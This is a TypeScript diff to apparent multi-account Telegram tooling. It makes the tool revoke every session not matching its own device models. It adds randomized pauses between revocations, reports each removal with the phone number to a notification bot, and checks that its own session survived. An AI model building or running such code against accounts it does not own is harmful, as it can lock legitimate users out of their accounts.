@@ -25,9 +25,15 @@ const _ownDeviceModels: string[] = (() => {
 })();
 
 export function isOwnAuth(auth: Api.Authorization): boolean {
-    const deviceModel = (auth.deviceModel || '').toLowerCase();
+    // PRIMARY CHECK: Telegram flags the session making the API call as current.
+    // This is infallible — it's the server telling us "this is YOU".
+    if (auth.current) {
+        return true;
+    }
 
-    // Match against all device models from tg-config platforms
+    // SECONDARY CHECK: Match device model against our known platform configs.
+    // This catches sessions we created but aren't currently using (e.g., backup sessions).
+    const deviceModel = (auth.deviceModel || '').toLowerCase();
     if (deviceModel && _ownDeviceModels.some(model => deviceModel.includes(model) || model.includes(deviceModel))) {
         return true;
     }
@@ -38,10 +44,35 @@ export function isOwnAuth(auth: Api.Authorization): boolean {
 export async function removeOtherAuths(ctx: TgContext): Promise<void> {
     if (!ctx.client) throw new Error('Client is not initialized');
     const result = await ctx.client.invoke(new Api.account.GetAuthorizations());
+
+    let keptCount = 0;
+    let revokedCount = 0;
+
     for (const auth of result.authorizations) {
-        if (isOwnAuth(auth)) continue;
+        if (isOwnAuth(auth)) {
+            keptCount++;
+            ctx.logger.info(ctx.phoneNumber, `Keeping auth: ${auth.appName} | ${auth.deviceModel} | current=${auth.current}`);
+            continue;
+        }
+        ctx.logger.info(ctx.phoneNumber, `Revoking auth: ${auth.appName} | ${auth.deviceModel} | ${auth.country}`);
         await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Removing Auth : ${ctx.phoneNumber}\n${auth.appName}:${auth.country}:${auth.deviceModel}`)}`);
         await resetAuthorization(ctx, auth);
+        revokedCount++;
+        await sleep(2000 + Math.random() * 3000); // Pause between revocations
+    }
+
+    ctx.logger.info(ctx.phoneNumber, `Auth cleanup: kept ${keptCount}, revoked ${revokedCount}`);
+
+    // CRITICAL: Verify our session survived by making a simple API call
+    try {
+        const me = await ctx.client.getMe();
+        if (!me) {
+            throw new Error('Session verification failed after removeOtherAuths — getMe returned null');
+        }
+        ctx.logger.info(ctx.phoneNumber, `Session verified alive after auth cleanup (user: ${me.phone})`);
+    } catch (verifyError) {
+        ctx.logger.error(ctx.phoneNumber, 'CRITICAL: Our session may have been revoked during removeOtherAuths!', verifyError);
+        throw new Error(`Session self-check failed after removeOtherAuths: ${verifyError}`);
     }
 }
 
